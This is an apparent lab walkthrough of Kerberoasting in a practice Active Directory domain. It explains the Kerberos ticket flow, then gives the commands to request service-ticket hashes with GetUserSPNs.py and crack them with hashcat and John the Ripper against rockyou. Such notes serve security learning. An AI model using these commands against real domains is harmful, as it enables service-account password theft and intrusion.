**Kerberoasting Overview**

<img width="707" height="497" alt="image" src="https://github.com/user-attachments/assets/05625c15-6614-495f-aae5-deed21f70547" />

Lets say there is an Application server, and we want to access it. In order to do that, there are following steps

Step 1: Client will send a TGT (Ticket Granting Ticket) request to Key Distribution Center (KDC). Client will provide its username and password to the DC

Step 2: KDC will authenticate and send TGT to the client. It means any user on the Domain can request this TGT.

Step 3: Once the client has TGT, client can ask for a Service Ticket (ST) / TGS from the KDC. In order to get a Service Ticket, client has to present TGT.

Step 4: The KDC will sent back the TGS / Service Ticket to the client. The interesting part is that, TGS is encrypted with the servers account hashes.

Step 5: Now the Client has the TGS / ST, it will present to the server that it want to access. In this case its Application Server.

Step 6: The Application server will decrypt the TGS / ST and check if the client has authority to access the service. If yes, it will allow to access, if no, the application will deny.

Now, in our attack, we care about step 4. As long as we have a valid TGT, we can request a TGS. That TGS will have the hashes of the services account.

**Kerberoasting Attack**

***GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.1.100 -request***

<img width="720" height="254" alt="image" src="https://github.com/user-attachments/assets/83f99da8-8754-4cf8-a198-3df6507f66a0" />

We got the hash. Let put this hash in a file

<img width="720" height="183" alt="image" src="https://github.com/user-attachments/assets/722e3849-0161-41b1-8803-2b17f7345d4a" />

Lets crack the hash

***hashcat -m 13100 krb_hash.txt /usr/share/wordlists/rockyou.txt***

<img width="720" height="445" alt="image" src="https://github.com/user-attachments/assets/6c475e3c-fa15-4bec-814c-589ec91e6053" />

And we got the password MYpassword123#

Lets try with john

***john krb_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs***

<img width="720" height="151" alt="image" src="https://github.com/user-attachments/assets/5b848fbb-8724-48e6-8147-26f8c2282a7c" />
